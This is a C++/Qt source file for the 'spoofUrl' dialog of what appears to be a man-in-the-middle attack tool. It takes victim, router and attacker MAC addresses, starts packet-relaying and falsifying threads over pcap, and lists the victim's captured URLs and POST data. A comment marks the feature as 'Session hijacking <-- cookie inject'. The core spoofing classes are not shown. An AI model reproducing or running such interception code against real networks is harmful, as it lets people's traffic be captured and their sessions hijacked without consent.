#include "spoofurl.h"
#include "ui_spoofurl.h"
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

QStringList spoof_urlList, spoof_dataList;
pcap_t *gotoUrl;
u_char *getUrlPacket;

spoofUrl::spoofUrl(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::spoofUrl)
{
    ui->setupUi(this);
    ui->listView->setEditTriggers(QAbstractItemView::NoEditTriggers);
}

spoofUrl::~spoofUrl()
{
    delete ui;
}
//Session hijacking <-- cookie inject
void spoofUrl::on_GoUrlBtn_clicked()
{
    QString url = ui->listView->currentIndex().data().toString();
    QDesktopServices::openUrl(url);
    /*
    for(int i = 0; i < spoof_dataList.length(); i++) {
        spoof_dataList.at(i);
    }*/
}

void spoofUrl::on_StopBtn_clicked()
{
    this->allStop();
    this->finished(1);
}

void spoofUrl::on_CancelBtn_clicked()
{
    this->allStop();
    this->finished(1);
    this->close();
}

void spoofUrl::spoof_getAll(QString getIP, QString getRouterIP, QString getLen, QString getRouterMac, QString getMyMac, QString getVictimMac, u_char *pkt, pcap_t *dump_p) {
    gotoUrl = dump_p;
    getUrlPacket = pkt;
    rep = new relay_falsify(this);
    rep->rep_getAll(getIP, getRouterIP, getLen, getVictimMac, getMyMac, getRouterMac, pkt, dump_p);
    rep->start();
    get = new relay_spoof(this);
    get->mac_get(getVictimMac, getMyMac, getRouterMac);
    get->start();
    spoof_md = new QStringListModel();
    connect(get, SIGNAL(urlList(QStringList)), this, SLOT(spoof_getUrl(QStringList)));
    connect(get, SIGNAL(urlList(QStringList)), this, SLOT(spoof_postUrl(QStringList)));
    connect(get, SIGNAL(spoof_fin(bool)), this, SLOT(spoof_get_fin(bool)));
}

void spoofUrl::spoof_getUrl(QStringList url_list) {
    spoof_urlList = url_list;
    spoof_md->setStringList(spoof_urlList);
    ui->listView->setModel(spoof_md);
}

void spoofUrl::spoof_postUrl(QStringList data_list) {
    spoof_dataList = data_list;
    //pcap_sendpacket(gotoUrl, getUrlPacket, sizeof(getUrlPacket));
}

void spoofUrl::spoof_get_fin(bool) {
    QMessageBox::information(this, "Spoof Finish", "Spoofing is finished!!");
}

void spoofUrl::allStop() {
    rep->stop = false;
    get->get_stop = true;
}
